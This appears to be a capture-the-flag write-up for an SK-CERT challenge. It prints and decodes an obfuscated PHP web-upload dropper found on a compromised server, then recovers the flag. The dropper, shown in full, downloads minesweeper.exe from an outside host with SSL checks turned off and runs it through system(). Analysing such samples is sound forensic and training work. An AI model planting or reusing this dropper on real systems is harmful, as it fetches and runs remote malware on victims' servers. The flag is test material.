# Compromised Network
## Description
A company that was compromised through a web vulnerability wrote to you and asked you to analyze the uploaded file. https://drive.google.com/file/d/1nIEpBkIjfnxLdcDHPPnT1FZZw-YkZ6VN/view?usp=share_link

## Task #1: Web Upload
Let's analyze the file 
```
<?php

goto rPWT0; rPWT0: set_time_limit(0); goto RYUyK; KmAz_: $WkyCp = curl_getinfo($zsKmS); goto X6zr3; ji5Q_: $vRdrc = "\155\x69\156\x65\x73\x77\x65\x65\x70\x65\162\x2e\x65\x78\145"; goto M5pF4; NuyZX: kQFBo: goto A20wO; nP6PB: goto kQFBo; goto G6Fhj; X6zr3: echo $WkyCp["\150\x74\x74\x70\137\x63\157\144\145"] == 200 ? "\x4f\x4b" : "\x45\122\x52\x4f\122\x20\x2d\40" . $WkyCp["\x68\164\x74\x70\x5f\143\157\x64\x65"]; goto nP6PB; dnT9_: fclose($e06v5); goto dRqYg; fdaCv: curl_exec($zsKmS); goto wtj5P; jzv0H: $zsKmS = curl_init(); goto SJMn5; wtj5P: if (curl_errno($zsKmS)) { goto Z40lA; } goto KmAz_; Xe49M: echo curl_error($zsKmS); goto NuyZX; A20wO: curl_close($zsKmS); goto dnT9_; dRqYg: $sXPPX = "\x53\x4b\55\x43\105\x52\x54\173\x72\x75\156\x6e\61\x6e\147\x5f\146\61\162\x35\x37\x5f\x31\x6e\x5f\x63\150\64\61\156\x7d"; goto i0Mbe; vKFxF: curl_setopt($zsKmS, CURLOPT_FILE, $e06v5); goto OK3Jl; RYUyK: $IR0Hx = "\150\x74\164\160\x73\x3a\57\57\x69\156\x74\x33\56\x73\153\57\155\x69\156\x65\163\167\x65\x65\x70\x65\x72\x2e\145\170\x65"; goto ji5Q_; DDrwT: curl_setopt($zsKmS, CURLOPT_SSL_VERIFYPEER, 0); goto fdaCv; ENwOf: curl_setopt($zsKmS, CURLOPT_SSL_VERIFYHOST, 0); goto DDrwT; OK3Jl: curl_setopt($zsKmS, CURLOPT_TIMEOUT, $PDVwa); goto ENwOf; G6Fhj: Z40lA: goto Xe49M; SJMn5: curl_setopt($zsKmS, CURLOPT_URL, $IR0Hx); goto vKFxF; M5pF4: $PDVwa = 30; goto YpodV; YpodV: $e06v5 = fopen($vRdrc, "\x77") or exit("\105\x72\x72\x6f\162\x20\157\x70\x65\156\x69\156\147\x20{$vRdrc}"); goto jzv0H; i0Mbe: system("{$vRdrc}\73\43{$sXPPX}");

?>
```

Two main functions for us to analyze are `curl_setopt` with `CURLOPT_URL` which sets URL to downlaod a file and `system` which executes a system command.

`curl_setopt($zsKmS, CURLOPT_URL, $IR0Hx)` url is `$IR0Hx`

Go to php interpreter and echo the string.
```
$ php -a
php > echo "\150\x74\164\160\x73\x3a\57\57\x69\156\x74\x33\56\x73\153\57\155\x69\156\x65\163\167\x65\x65\x70\x65\x72\x2e\145\170\x65";
https://int3.sk/minesweeper.exe
```

`system` cats 3 strings together
`\155\x69\156\x65\x73\x77\x65\x65\x70\x65\162\x2e\x65\x78\145` + `\73\43` + `\x53\x4b\55\x43\105\x52\x54\173\x72\x75\156\x6e\61\x6e\147\x5f\146\61\162\x35\x37\x5f\x31\x6e\x5f\x63\150\64\61\156\x7d`

```
$ php -a
php > echo "\155\x69\156\x65\x73\x77\x65\x65\x70\x65\162\x2e\x65\x78\145\73\43\x53\x4b\55\x43\105\x52\x54\173\x72\x75\156\x6e\61\x6e\147\x5f\146\61\162\x35\x37\x5f\x31\x6e\x5f\x63\150\64\61\156\x7d";
minesweeper.exe;#SK-CERT{runn1ng_f1r57_1n_ch41n}
```

### Flag #1
**SK-CERT{runn1ng_f1r57_1n_ch41n}**